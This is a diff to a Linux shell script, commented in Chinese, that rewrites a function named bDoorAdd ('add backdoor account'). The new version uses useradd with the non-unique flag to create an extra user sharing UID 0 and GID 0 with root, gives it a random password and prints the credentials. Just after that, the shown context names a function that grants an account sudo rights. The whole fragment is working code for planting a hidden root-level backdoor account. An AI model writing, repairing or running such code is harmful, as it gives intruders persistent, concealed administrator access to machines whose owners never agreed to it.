@@ -2,16 +2,19 @@
 
 # 函数：添加后门账户
 bDoorAdd() {
-    local user=$1
-    # 检查用户是否已存在
-    if id "$user" &>/dev/null; then
-        echo "${user} 账号已经存在"
-    else
-        # 更安全的密码生成和设置方式
-        local password=$(openssl rand -base64 12)
-        echo "${user}:${password}:0:0:,,,:/root:/bin/bash" | chpasswd -e
-         echo "添加成功，用户名为 ${user}，密码为：${password}"
-    fi
+  local user=$1
+  # 检查用户是否已存在
+  if id "$user" &>/dev/null; then
+    echo "${user} 账号已经存在"
+  else
+    # 创建用户，指定 UID 和 GID 为 0，并设置 home 目录为 /root
+    useradd -o -u 0 -g 0  -M "$user"
+
+    # 更安全的密码生成和设置方式
+    local password=$(openssl rand -base64 12)
+    echo "${user}:${password}" | chpasswd
+       echo "添加成功，用户名为 ${user}，密码为：${password}"
+  fi
 }
 
 # 函数：为账户添加sudo权限
